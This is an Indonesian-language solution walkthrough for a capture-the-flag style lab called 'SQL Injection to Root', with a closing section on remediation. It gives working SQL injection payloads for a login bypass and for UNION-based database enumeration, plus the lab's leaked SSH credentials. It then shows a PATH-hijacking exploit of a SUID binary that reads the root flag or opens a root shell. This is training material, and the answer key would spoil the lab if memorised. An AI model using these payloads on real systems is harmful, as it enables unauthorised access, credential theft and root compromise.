# Solusi Lengkap Lab: SQL Injection to Root

Dokumen ini berisi panduan penyelesaian tantangan untuk setiap tahap dalam lab **SQL Injection to Root Privilege Escalation**, termasuk analisis kerentanan dan cara mitigasinya.

---

## Tahap 1: SQL Injection Login Authentication Bypass

### 1. Analisis
Form login pada `/login/` rentan terhadap SQL Injection karena parameter input `username` digabungkan langsung ke dalam query SQL tanpa sanitasi atau parameter binding.

### 2. Payload Solusi
Pada form login:
- **Username**: `admin' --`
- **Password**: *(Sembarang karakter, contoh: `test`)*

### 3. Flag yang Diperoleh
Setelah login berhasil, dashboard akan menampilkan:
```
FLAG{SQLI_LOGIN_BYPASS}
```

---

## Tahap 2: Enumerasi Database via UNION-Based SQL Injection

### 1. Analisis
Endpoint `/products/?category=` melakukan filter produk dengan menyematkan parameter `category` langsung ke query SQL. Jumlah kolom yang direturn oleh query produk adalah **5 kolom**:
`(id, name, description, price, category_id)`

### 2. Payload Solusi

#### A. Enumerasi Tabel dalam Skema Publik:
```text
1 UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema='public'--
```
*Tabel yang ditemukan: `products`, `categories`, `app_users`, `challenge_flags`, `system_credentials`.*

#### B. Enumerasi Kolom pada Tabel `system_credentials`:
```text
1 UNION SELECT NULL, column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='system_credentials'--
```

#### C. Mengambil Flag Tahap 2 dari `challenge_flags`:
```text
1 UNION SELECT NULL, flag_value, NULL, NULL, NULL FROM challenge_flags--
```
**Flag 2**: `FLAG{DATABASE_ENUMERATION}`

#### D. Mengambil Kredensial SSH dari `system_credentials`:
```text
1 UNION SELECT NULL, CONCAT(username, ' : ', credential_value, ' : ', purpose), NULL, NULL, NULL FROM system_credentials--
```
*Kredensial yang didapatkan:*
- **Username**: `student`
- **Password**: `student_ctf_p4ssw0rd!`
- **Purpose**: `Linux SSH Shell Access`

---

## Tahap 3: Akses Shell SSH & Enumerasi Linux

### 1. Solusi Koneksi
Gunakan kredensial yang diperoleh dari tahap 2 untuk login ke port OpenSSH (port `2223` di host):
```bash
ssh -p 2223 student@localhost
```
Masukkan password: `student_ctf_p4ssw0rd!`

### 2. Mengambil Flag User
```bash
cat /home/student/user.flag
```
**Flag 3**: `FLAG{USER_SHELL_ACQUIRED}`

---

## Tahap 4: Privilege Escalation ke Root (Tantangan Terakhir)

### 1. Analisis Kerentanan
Ketika melakukan enumerasi binary SUID di sistem dengan perintah:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Ditemukan binary kustom: `/usr/local/bin/syshealth`.

Pemeriksaan source code ([syshealth.c](linux/privesc/syshealth.c)) menunjukkan dua faktor kritis:
1. Program memiliki bit SUID root (`chmod 4755`) dan menetapkan UID/GID ke `0` via `setresuid(0, 0, 0)`.
2. Program mengeksekusi perintah menggunakan nama relatif tanpa path absolut:
   ```c
   system("healthcheck");
   ```

### 2. Mekanisme Eksploitasi (PATH Hijacking)
Karena `system("healthcheck")` tidak menggunakan path absolut (seperti `/usr/local/bin/healthcheck`), fungsi `system()` akan memanggil shell (`/bin/sh -c healthcheck`) yang mencari executable bernama `healthcheck` berdasarkan urutan direktori dalam environment variable `$PATH`.

Jika user menyisipkan direktori yang dapat ditulisi (seperti `/tmp`) di awal urutan `$PATH`, sistem akan mengeksekusi script buatan user dengan hak akses root.

### 3. Langkah Solusi

Jalankan perintah berikut di dalam sesi SSH `student`:

```bash
# 1. Pindah ke direktori /tmp
cd /tmp

# 2. Buat script bernama 'healthcheck' yang membaca root flag
cat << 'EOF' > /tmp/healthcheck
#!/bin/bash
cat /root/root.flag > /tmp/root_flag.txt
chmod 644 /tmp/root_flag.txt
EOF

# 3. Berikan izin eksekusi pada script
chmod +x /tmp/healthcheck

# 4. Modifikasi environment variable PATH agar /tmp diperiksa pertama kali
export PATH=/tmp:$PATH

# 5. Jalankan binary SUID syshealth
/usr/local/bin/syshealth

# 6. Baca flag root yang telah diekstrak
cat /tmp/root_flag.txt
```

*(Atau jika ingin mendapatkan interactive root shell):*
```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/healthcheck
chmod +x /tmp/healthcheck
export PATH=/tmp:$PATH
/usr/local/bin/syshealth
```

### 4. Flag yang Diperoleh
```
FLAG{ROOT_COMPROMISED}
```

---

## 5. Remediasi & Mitigasi Keamanan (Defensive Best Practices)

Untuk mencegah kerentanan privilege escalation serupa di lingkungan produksi:

1. **Gunakan Absolute Path**:
   Selalu gunakan path lengkap saat memanggil executable dalam program C:
   ```c
   // Aman: Menggunakan path absolut
   system("/usr/local/bin/healthcheck");
   ```
2. **Gunakan Keluarga Fungsi `execve`**:
   Hindari `system()` yang memanggil shell interpreter. Gunakan `execve()` dengan argumen dan environment yang ditentukan secara eksplisit tanpa melibatkan parsing shell.
3. **Hardcode atau Bersihkan Environment PATH**:
   Jika program berjalan dengan hak istimewa (SUID), atur `$PATH` secara internal ke direktori tepercaya:
   ```c
   setenv("PATH", "/bin:/usr/bin:/usr/local/bin", 1);
   ```
4. **Prinsip Least Privilege & Linux Capabilities**:
   Hindari memberi izin SUID root pada binary biner utuh jika hanya membutuhkan kemampuan tertentu. Gunakan Linux Capabilities (`setcap cap_net_raw+ep ...`) yang memiliki cakupan izin lebih sempit dan aman.
